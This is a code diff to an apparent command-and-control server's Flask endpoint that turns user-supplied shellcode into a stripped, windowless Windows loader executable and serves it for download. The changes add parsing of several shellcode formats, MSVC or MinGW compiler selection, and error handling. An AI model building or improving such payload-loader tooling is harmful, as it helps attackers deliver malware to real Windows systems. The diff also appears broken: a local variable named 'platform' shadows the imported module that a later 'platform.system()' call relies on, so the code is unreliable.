@@ -5,6 +5,7 @@ import sys
 import base64
 import tempfile
 import subprocess
+import platform
 
 # Add the parent directory to the path to import from C2_Server
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -180,16 +181,36 @@ def compile_shellcode_exe():
         if platform != 'windows':
             return jsonify({'error': 'Only Windows platform is supported for .exe compilation'}), 400
         
-        # Decode shellcode
+        # Decode shellcode - handle different formats
         try:
-            shellcode_bytes = base64.b64decode(shellcode_b64)
+            # Try to parse directly if it's base64
+            try:
+                shellcode_bytes = base64.b64decode(shellcode_b64)
+            except:
+                # If it fails, it might be formatted code, clean it
+                if shellcode_b64.startswith('b\'\\x') or shellcode_b64.startswith('"\\x'):
+                    # Python-style shellcode format: b'\x90\x90...'
+                    # Remove prefix/suffix and split into bytes
+                    cleaned = shellcode_b64.replace('b\'', '').replace('\'', '')
+                    cleaned = cleaned.replace('"', '').replace('\\x', '')
+                    # Convert hex pairs to bytes
+                    shellcode_bytes = bytes.fromhex(cleaned)
+                elif ' ' in shellcode_b64:
+                    # Raw bytes format with spaces: "90 90 90..."
+                    cleaned = shellcode_b64.replace(' ', '')
+                    shellcode_bytes = bytes.fromhex(cleaned)
+                else:
+                    # Last attempt - try hex decoding
+                    try:
+                        shellcode_bytes = bytes.fromhex(shellcode_b64)
+                    except:
+                        raise ValueError("Could not decode shellcode - invalid format")
+                        
+            # Create C-style hex representation
             shellcode_hex = ''.join([f'\\x{b:02x}' for b in shellcode_bytes])
         except Exception as e:
+            print(f"Shellcode decode error: {str(e)}")
             return jsonify({'error': f'Failed to decode shellcode: {str(e)}'}), 400
-        
-        # Check if MinGW is installed
-        if not check_mingw():
-            return jsonify({'error': 'MinGW compiler not found. Please install it to compile executables.'}), 500
         
         # Create tempfiles for source and exe
         with tempfile.NamedTemporaryFile(suffix='.cpp', delete=False) as cpp_file:
@@ -234,27 +255,85 @@ int main() {{
         # Compile the code
         exe_path = os.path.splitext(cpp_path)[0] + '.exe'
         
-        compile_cmd = [
-            "x86_64-w64-mingw32-g++", 
-            cpp_path,
-            "-o", exe_path,
-            "-mwindows",
-            "-s",  # Strip symbols
-            "-static-libgcc", "-static-libstdc++",  # Static linking
-        ]
+        # Check for compiler - try MSVC (cl.exe) if on Windows, otherwise MinGW
+        use_msvc = False
         
-        result = subprocess.run(
-            compile_cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
+        if platform.system() == 'Windows':
+            # Try to find cl.exe (MSVC compiler)
+            try:
+                # Check if cl.exe is available in PATH
+                result = subprocess.run(
+                    ["where", "cl.exe"],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    check=False
+                )
+                if result.returncode == 0:
+                    use_msvc = True
+            except Exception as e:
+                print(f"Error checking for cl.exe: {str(e)}")
+                pass
+        
+        # If MSVC is available and we're on Windows, use it
+        if use_msvc:
+            compile_cmd = [
+                "cl.exe",
+                "/EHsc",
+                "/nologo",
+                "/O2",
+                cpp_path,
+                "/Fe" + exe_path,
+                "/link",
+                "/SUBSYSTEM:WINDOWS"
+            ]
+        else:
+            # Check if MinGW is installed
+            if not check_mingw():
+                # Clean up temp file
+                try:
+                    os.unlink(cpp_path)
+                except:
+                    pass
+                return jsonify({'error': 'No suitable compiler found. Please install MinGW (x86_64-w64-mingw32-g++) or Microsoft Visual C++ (cl.exe).'}), 500
+                
+            # Use MinGW
+            compile_cmd = [
+                "x86_64-w64-mingw32-g++", 
+                cpp_path,
+                "-o", exe_path,
+                "-mwindows",
+                "-s",  # Strip symbols
+                "-static-libgcc", "-static-libstdc++",  # Static linking
+            ]
+        
+        try:
+            result = subprocess.run(
+                compile_cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                check=False
+            )
+        except Exception as e:
+            # Clean up temp file
+            try:
+                os.unlink(cpp_path)
+            except:
+                pass
+            return jsonify({'error': f'Compilation process failed: {str(e)}'}), 500
         
         # Clean up the source file
-        os.unlink(cpp_path)
+        try:
+            os.unlink(cpp_path)
+        except Exception as e:
+            print(f"Warning: Could not delete temp file: {str(e)}")
         
         if result.returncode != 0:
             error_msg = result.stderr.decode()
             return jsonify({'error': f'Compilation failed: {error_msg}'}), 500
+            
+        # Check if the exe file was created
+        if not os.path.exists(exe_path):
+            return jsonify({'error': 'Compilation completed but executable was not created'}), 500
             
         # Return the executable
         try:
@@ -273,8 +352,11 @@ int main() {{
                 attachment_filename="shellcode_loader.exe",
                 mimetype="application/octet-stream"
             )
+        except Exception as e:
+            return jsonify({'error': f'Error serving file: {str(e)}'}), 500
         
     except Exception as e:
+        print(f"Unhandled error in compile_shellcode_exe: {str(e)}")
         return jsonify({'error': f'Error compiling shellcode executable: {str(e)}'}), 500
 
 @app.route('/api/tasks', methods=['POST'])
